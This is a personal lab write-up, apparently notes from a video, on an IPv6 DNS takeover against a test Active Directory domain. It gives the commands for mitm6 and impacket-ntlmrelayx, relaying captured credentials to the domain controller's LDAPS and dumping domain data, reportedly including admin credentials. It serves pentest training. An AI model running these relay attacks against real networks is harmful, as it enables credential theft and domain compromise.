---
created_date: 02 October 2023
updated_date: 02 October 2023
type: windows
url: https://www.youtube.com/watch?v=zzbIuslB58c
---
##### Machine Information
```
Gobots (Attacker)
===============

192.168.146.134/135 (ALLIANCE/HORDE Workstations)
===============
```
### High-Level Summary

The mitm6 server is going to listen for credentials, pass credentials to ldap `ldaps:192.168.146.132` in the ntlmrelay & spit out domain information including DOMAIN ADMIN CREDS into loot directory.

-------------
##### Initial Scanning

- Default scanning conducted in [[1 link-local_multicast_name_Resolution (LLMNR)]]

-------
###### Adding an IPv6 Address to Kali
```bash
[root💀/opt/mitm6/build/lib.linux-x86_64-2.7/mitm6] [192.168.146.129] [2023-10-02 16:57:48] 
 └─╼ # sysctl -w net.ipv6.conf.all.disable_ipv6=0
```
![[Pasted image 20231002165907.png]]
![[Pasted image 20231002165922.png]]
###### IPV6 DNS takeover
#mitm6
- Start mitm6 python server
- Need to wait for DNS every 30 minutes, if own environment can reset a WKSTN and it will pull dns all over again
The mitm6 server is going to listen for credentials, pass credentials to ldap `ldaps:192.168.146.132` in the ntlmrelay 
```bash
[root💀/opt/mitm6/build/lib.linux-x86_64-2.7/mitm6] [192.168.146.129] [2023-10-02 16:57:48] 
 └─╼ # python3 mitm6.py 
/opt/mitm6/build/lib.linux-x86_64-2.7/mitm6/mitm6.py:283: SyntaxWarning: "is" with a literal. Did you mean "=="?
```
While the HORDE-WKSTN was reseting started `impacket-ntlmrelayx`
#ntlmrelayx 
```bash
[root💀/usr/bin] [192.168.146.129] [2023-10-02 17:00:36] 
 └─╼ # ./impacket-ntlmrelayx -6 -t ldaps://192.168.146.132 -wh fakewpad.blizzard.local -l loot
- ldaps: Domain Controller IP address
- wh fakewpad
- -l = dumping loot into loot folder
```
Once the HORDE-WKSTN came back up the mitm6 server passed the ldap creds to the `ntlmrelayx` session with the creds and dumped information to the loot directory
![[Pasted image 20231002172644.png]]
Location of loot directory
#loot
![[Pasted image 20231002172824.png]]
Ran `firefox domain_users_by_group.html` and got Domain credentials via domain info.
![[Pasted image 20231002172935.png]]